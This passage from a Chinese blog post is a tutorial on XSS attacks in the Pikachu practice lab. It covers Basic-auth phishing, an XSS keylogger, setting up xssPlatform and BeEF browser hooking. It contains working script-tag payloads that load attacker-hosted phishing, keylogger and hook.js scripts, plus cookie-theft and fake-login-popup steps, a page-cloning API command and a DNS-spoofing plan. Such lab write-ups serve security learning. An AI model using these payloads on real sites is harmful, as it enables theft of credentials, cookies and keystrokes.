<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105134632.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105134632.png" alt="image-20230614105134632"></p>
<p>这里是用自带的后台所获取的(这里修改好了,原因在于url错误少了pikachu)</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110625908.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110625908.png" alt="image-20230614110625908"></p>
<h3 id="0x12-XSS-fish"><a href="#0x12-XSS-fish" class="headerlink" title="0x12-XSS-fish"></a>0x12-XSS-fish</h3>
<p><strong>简述一下钓鱼攻击</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">用basic认证实现钓鱼场景<br><br>在实际的攻击场景当中  xss钓鱼的场景非常多   可以内嵌一些钓鱼页面  或者钓鱼链接<br><br>这里用basic认证实现钓鱼<br><br>在存在xss漏洞的页面  内嵌一个请求（javascript或者其他）<br><br>当用户打开了嵌入恶意代码的页面之后   页面会向远端的  后台（pkxss去发送一个请求）<br><br>这个请求会返回一个要求他进行bacis认证的头部    在用户界面上就会弹出一个要进行身份认证的提示框     一旦他输入了账号密码   这个账号密码就会发送到我们的pkxss后台<br></code></pre></td></tr></table></figure>
<p>黑客可以在有存储型XSS漏洞的网站中嵌入一个恶意JS，当用户访问该站点时自动触发，而在黑客后台向用户返回一个要求Basic认证的头部，那么此时用户界面就会弹出一个身份认证的提示框。如果用户防范意识不高，在提示框中输入了网站的账号密码，那么该账号密码就会被发送到黑客后台。</p>
<p>Pikachu靶场同样准备好了钓鱼的文件，只需要修改IP地址即可。打开Pikachu/pkxss/xfish/fish.php文件，将IP地址修改为黑客后台地址，注意IP地址后面需要添加上/pikachu/目录，还有需要注意的是header(Location: …)此句，将换行删除，否则无法跳转。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110911065.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110911065.png" alt="image-20230614110911065"></p>
<p>然后在黑客浏览器中访问存储型XSS页面，插入恶意代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111025197.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111025197.png" alt="image-20230614111025197"></p>
<p>打开另一个浏览器模拟普通用户，访问存储型XSS页面：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/xss/xss_stored.php">http://127.0.0.1/pikachu/vul/xss/xss_stored.php</a>。此时页面会弹出一个Basic认证提示框，模拟用户输入账号密码，点击确定</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111350817.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111350817.png" alt="image-20230614111350817"></p>
<p>这一步有个坑就是Basic认证后不跳转，而是一直在弹认证提示框。尝试过修改修改PHP版本、修改pkxss路径、使用2台虚拟机分别搭建漏洞网站和黑客后台环境等等方法都不行，无奈最终使用作弊的方法写入：将下面语句插入存储型XSS处，然后使用用户浏览器访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/xfish.php?username=naraku&amp;password=1234&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>上面这个坑后来找到了原因：<strong>PHP 的 HTTP 认证机制仅在 PHP 以 Apache 模块方式运行时才有效，因此该功能不适用于 CGI 版本</strong>，我这里使用的是phpStudy搭建的环境，默认是以CGI版本运行PHP。后续通过重新搭建环境解决此问题。</p>
<p>此时，黑客可以在XSS后台的钓鱼记录处看到用户输入的账号密码(这里我没有解决)</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111443421.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111443421.png" alt="image-20230614111443421"></p>
<h3 id="0x13-XSS-键盘记录"><a href="#0x13-XSS-键盘记录" class="headerlink" title="0x13-XSS-键盘记录"></a>0x13-XSS-键盘记录</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">跨域：<br>当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。<br><br>跨域同源策略<br><br>出于安全考虑，所有的浏览器都约定了&quot;同源策略&quot;， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。<br><br>如果想要跨域操作,则需要管理员进行特殊的配置。<br>比如通过: header( &quot;Access -Control Allow- Origin:x.com&quot; )指定<br></code></pre></td></tr></table></figure>
<p>打开pikachu/pkxss/rkeypress/rk.js文件，将第54行语句并修改为黑客后台地址：</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111609567.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111609567.png" alt="image-20230614111609567"></p>
<p>浏览器进入存储型XSS漏洞：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/xss/xss_stored.php">http://127.0.0.1/pikachu/vul/xss/xss_stored.php</a>，插入恶意代码rk.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>另开一个浏览器模拟普通用户进入该漏洞页面，任意输入一些字符，无需点击提交</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111808477.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111808477.png" alt="image-20230614111808477"></p>
<p>这里不知为何js代码的event函数失效,暂时解决不了,太菜了,日后有缘再见</p>
<h3 id="0x14-自搭xssPlatform"><a href="#0x14-自搭xssPlatform" class="headerlink" title="0x14-自搭xssPlatform"></a>0x14-自搭xssPlatform</h3>
<p>参考:<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021899373">https://segmentfault.com/a/1190000021899373</a></p>
<p>这里不用管127.0.0.1与xss.localhost的映射</p>
<h4 id="1-数据库搭建"><a href="#1-数据库搭建" class="headerlink" title="1-数据库搭建"></a>1. 数据库搭建</h4>
<p>xssPlatform渗透测试系统使用的数据库是MySQL，因此笔者需要先安装mysql数据库服务，为了简化安装，便直接使用了docker方式进行，参考命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker run --name mysqlserver -e MYSQL_ROOT_PASSWORD=123 -d -i -p 3309:3306  mysql:5.6<br></code></pre></td></tr></table></figure>
<h4 id="2-xssPlatform搭建"><a href="#2-xssPlatform搭建" class="headerlink" title="2-xssPlatform搭建"></a>2. xssPlatform搭建</h4>
<p>在安装完MySQL服务之后，便可以安装xssPlatform系统了，笔者已经将所需PHP和nginx环境封装好了，因此只需下载镜像运行即可</p>
<h5 id="2-1-运行容器"><a href="#2-1-运行容器" class="headerlink" title="2-1-运行容器"></a>2.1 运行容器</h5>
<p>在运行容器时候需要考虑两个问题，首先需要将web端口映射出来宿主机才可以访问，第二个是需要考虑此容器要能访问得到mysql服务，因此参考命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker run --name xssPlatform_test --link mysqlserver:db  -d -i  -p 8888:80   daxia/websafe:latest<br></code></pre></td></tr></table></figure>
<h5 id="2-2-启动服务"><a href="#2-2-启动服务" class="headerlink" title="2-2-启动服务"></a>2.2 启动服务</h5>
<p>在启动容器之后，通过浏览器访问<code>http://xss.localhost:8888/</code>不能打开，原因是因为容器里的<code>nginx</code>服务和<code>PHP</code>服务都还未启动，<code>首次</code>启动的命令参考如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> xssPlatform_test zsh -c <span class="hljs-string">&quot;php /root/start.php&quot;</span><br></code></pre></td></tr></table></figure>
<p>此时再通过浏览器访问<code>http://xss.localhost:8888/</code>，便可以打开安装协议页面，如下图所示</p>
<blockquote>
<p>如果是重启容器后,需要启动XSS平台,则用一下命令免得重新安装<br>
<code>docker exec xssPlatform_test zsh -c &quot;/usr/sbin/php-fpm7.2 -R &amp;&amp; nginx&quot;</code></p>
</blockquote>
<h5 id="2-3-系统安装"><a href="#2-3-系统安装" class="headerlink" title="2-3-系统安装"></a>2.3 系统安装</h5>
<p>安装过程比较简单，但在填写数据库地址的时候需要注意，我们已经将mysqlserver链接到了xssPlatform容器当中，此时数据库地址直接填写<code>db</code>即可,数据库密码笔者在启动MySQL容器时设置的为<code>123</code>，这里也填写<code>123</code>数据库名称为permeate_test</p>
<p>通过前面添加虚拟主机和添加host解析之后，便可以通过浏览器访问此平台，URL地址为<code>http://xss.localhost:8888/</code>,打开后会自动跳转到安装界面，如下图所示</p>
<p><strong>伤心的是这个配置文件似乎问题好多,我暂时不想解决了…(日后有缘再见)</strong></p>
<p>可以参考另一个平台的配置(说不定日后还是用的到)</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12176961.html">https://www.cnblogs.com/Cl0ud/p/12176961.html</a></p>
<h3 id="0x15-kali-beef-xss"><a href="#0x15-kali-beef-xss" class="headerlink" title="0x15-kali-beef-xss"></a>0x15-kali beef-xss</h3>
<h4 id="15-1-BeEF简介"><a href="#15-1-BeEF简介" class="headerlink" title="15-1-BeEF简介"></a>15.1 BeEF简介</h4>
<p>BeEF是The Browser Exploitation Framework的缩写。它是一种专注于Web浏览器的渗透测试工具。</p>
<p>beef管理，挂钩web浏览器的过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">什么是hook?<br><br>在windows系统中，一切皆消息，比如按了一下键盘，也是一个消息，Hook的意思是勾住，也就是在消息过去之前，可以先把消息勾住，不让其传递，你可以优先处理，也即这项技术就是提供了一个入口，能够针对不同的消息或者API在执行前，先执行你的操作，你的操作也称为「钩子函数」，所以，有的时候程序员在讨论的时候，也经常会说，可以先hook住，在处理，也即在执行某某操作之前，优先处理一下<br></code></pre></td></tr></table></figure>
<pre><code>生成交互 payload 的 hook；
服务器端：beef 作为服务端管理，管理访问运行了 hook 的客户端；
客户端：运行与客户端浏览器的 js 脚本，也就是 beef 生成的 payload；
beef 将运行了 hook 的 web 浏览器钩住，进行管理
</code></pre>
<h4 id="15-2-攻击手段"><a href="#15-2-攻击手段" class="headerlink" title="15-2-攻击手段"></a>15.2 攻击手段</h4>
<p>配合xss，将hook插入到存在xss的注入处；<br>
直接诱使客户端访问含有 hook 的伪造站点；<br>
结合中间人攻击注入 hook 脚本</p>
<p>用途：键盘记录器、网络扫描、浏览器信息收集、绑定 shell、与 metasploit 集成等</p>
<h4 id="15-3-靶场演示"><a href="#15-3-靶场演示" class="headerlink" title="15-3-靶场演示"></a>15.3 靶场演示</h4>
<p>安装包:<a target="_blank" rel="noopener" href="https://gitlab.com/kalilinux/packages/beef-xss">https://gitlab.com/kalilinux/packages/beef-xss</a></p>
<p>终端输入beef-xss启动，登录web页面：</p>
<p>账户:beef;密码:bcx123</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615185617829.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615185617829.png" alt="image-20230615185617829"></p>
<p>专有名词:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hocked Browers：<br><br>    online browers 在线浏览器<br>    offline browers 离线浏览器<br>    登录成功后，这里会显示在线的主机和不在线的主机。在线的就是现在该主机浏览器执行了我们的JS脚本代码，不在线的就是该主机曾经执行过我们的JS脚本代码，但是现在叉掉了该页面<br><br><br>Detials：<br><br>    浏览器、插件版本信息，操作系统信息<br><br>Logs：<br><br>    浏览器动作：焦点变化，鼠标单击，信息输入<br><br>commands：<br><br>    绿色模块：表示模块适用当前用户，并且执行结果对用户不可见<br>    红色模块：表示模块不适用当前用户，有些红色模块也可以执行<br>    橙色模块：模块可用，但结果对用户可见<br>    灰色模块：模块为在目标浏览器上测试过<br>    <br>另一个解释的版本:<br><br>	绿色的代表该功能有效，并且执行不会被用户所发现<br><br>	橙色的代表该功能有效，但是执行会被用户所发现<br><br>	白色的代表该功能不确定是否有效<br><br>	红色的代表该功能无效<br></code></pre></td></tr></table></figure>
<p>构造payload插入注入点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script src=&quot;http://192.168.4.212:3000/hook.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190225643.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190225643.png" alt="image-20230615190225643"></p>
<p>提交后靶机的浏览器就被勾住了</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190155329.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190155329.png" alt="image-20230615190155329"></p>
<h4 id="15-4-BeEF管理"><a href="#15-4-BeEF管理" class="headerlink" title="15-4-BeEF管理"></a>15.4 BeEF管理</h4>
<p>Detailes模块是浏览器、插件版本信息，操作系统信息：</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190304167.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190304167.png" alt="image-20230615190304167"></p>
<p>Logs模块可以查看鼠标点击，键盘输入的一些操作：</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190343645.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190343645.png" alt="image-20230615190343645"></p>
<p>commands模块可以对目标系统进行入侵：</p>
<p><strong>1.create Alert Dialog可以在目标系统上弹窗</strong></p>
<p>离谱的是我一直点击没反应,于是我怀疑是百度翻译的锅,果不其然啊…</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192005502.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192005502.png" alt="image-20230615192005502"></p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190915568.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190915568.png" alt="image-20230615190915568"></p>
<p><strong>2.获取用户Cookie</strong></p>
<p>我们点击Browser—&gt;Hooked Domain —&gt;Get Cookie，然后点击右下角的Execute</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192044762.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192044762.png" alt="image-20230615192044762"></p>
<p>然后点击我们执行的那条命令，右边就可以看到浏览器的 Cookie 了。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192119271.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192119271.png" alt="image-20230615192119271"></p>
<p><strong>3.网页重定向</strong></p>
<p>我们点击Browser—&gt;Hooked Domain —&gt;Redirect Browser，然后点击右下角的Execute，然后用户的浏览器的该页面就会跳转到百度的页面了。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192224620.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192224620.png" alt="image-20230615192224620"></p>
<p>我果然跳转了</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192239183.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192239183.png" alt="image-20230615192239183"></p>
<p><strong>4.社工弹窗</strong></p>
<p>我们点击Social Engiineering——&gt;Pretty Theft ，然后右上角选择弹窗的类型，右下角点击 Execute</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192359743.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192359743.png" alt="image-20230615192359743"></p>
<p>然后浏览器那边就会弹出框，如果你在框内输入了用户名和密码的话</p>
<p>前提是该受害者还未关闭当前页面</p>
<p>如果用户输入了用户名和密码，点击了Log in的话，我们后台是可以收到密码的</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192759774.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192759774.png" alt="image-20230615192759774"></p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192858584.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192858584.png" alt="image-20230615192858584"></p>
<p><strong>5.钓鱼网站(结合DNS欺骗)</strong></p>
<p>进入/usr/share/beef-xss/ 目录下，执行命令：<strong>./beef</strong>　启动 beef ，API Token值</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193044908.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193044908.png" alt="image-20230615193044908"></p>
<p>新打开一个页面，执行下面的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;url&quot;:&quot;https://www.baidu.com/&quot;,&quot;mount&quot;:&quot;/&quot;&#125;&#x27; -X POST http://192.168.4.212:3000/api/seng/clone_page?token=6281dff63d7c43e2ba76b3900d1a65de05a35770   #这里的地址token是我们上一步获取到的token<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193231941.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193231941.png" alt="image-20230615193231941"></p>
<p>我们克隆的网站在目录：/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages 下</p>
<p>很遗憾我这里显示不了,就先看个思路吧</p>
<p>我们访问：<a target="_blank" rel="noopener" href="http://192.168.4.212:3000/">http://192.168.4.212:3000/</a> ， 可以看到和百度一模一样。只要别人访问了该链接，这个浏览器就可以被我们控制了！</p>
<p>这里就借用别人的图片了</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193846749.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193846749.png" alt="image-20230615193846749"></p>
<p>那么，如何让其他人访问我们的这个链接呢？我们可以结合DNS欺骗，将百度的地址解析到我们的这个链接上，这样，别人访问百度的时候就自动跳转到我们的这个页面了？</p>
<p>进行DNS欺骗之前，先去配置文件中把3000端口改成80端口</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193938966.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193938966.png" alt="image-20230615193938966"></p>
<p>然后利用bettercap进行DNS欺骗。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193947420.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193947420.png" alt="image-20230615193947420"></p>
<p>然后重新打开beef，然后克隆www.baidu.com网站</p>
<p><a target="_blank" rel="noopener" href="http://xn--www-g88dw3xuk5a03fumy5k1be0btuk3s9a8wm.baidu.com">只要被欺骗的主机访问www.baidu.com</a>，其实跳转到了我们克隆的网站。这里百度的图片没加载出来，有点尴尬。</p>
<p class='item-img' data-src='%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193959786.png'><img src="%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193959786.png" alt="image-20230615193959786"></p>
<p>这里就先这样吧,日后进阶更深的command在看如下文章</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/178512.html">https://www.freebuf.com/sectool/178512.html</a></p>
<p>不得不说这工具感情好啊,那xssplatform感觉很逊,不知道日后有啥亮眼的呢</p>
<h4 id="15-5-联合Metasploit"><a href="#15-5-联合Metasploit" class="headerlink" title="15-5-联合Metasploit"></a>15.5 联合Metasploit</h4>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15183497/2737453">https://blog.51cto.com/u_15183497/2737453</a></p>
</script></p><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/07/%E6%B5%85%E6%9E%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">← Next 浅析文件包含</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/06/NewsCenter/">攻防世界-NewsCenter Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">XSS注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、XSS漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、XSS漏洞的危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、XSS漏洞的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">1、反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">2、存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81DOM%E5%9E%8BXSS"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">3、DOM型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E4%B8%80%E7%A7%8DXSS"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">4、判断是哪一种XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、XSS漏洞的检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">1、检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">2、防御</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">1.基于存储型的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%97%A0CSP%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84XSS"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 无CSP保护下的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%B5%8C%E5%85%A5%E5%9E%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.直接嵌入型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-import%E5%AF%BC%E5%85%A5%E5%9E%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.import导入型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-script%E5%AF%BC%E5%85%A5%E5%9E%8B"><span class="toc-number">2.1.3.</span> <span class="toc-text">3.script导入型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%9C%89CSP%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84XSS"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 有CSP保护下的XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.内容安全策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89-CSP%E7%AD%96%E7%95%A5"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">（1） CSP策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AD%96%E7%95%A5%E6%8C%87%E4%BB%A4"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">（2） 常用的策略指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E6%BA%90"><span class="toc-number">2.2.1.2.1.</span> <span class="toc-text">内容源</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%B3%E8%BD%AC"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 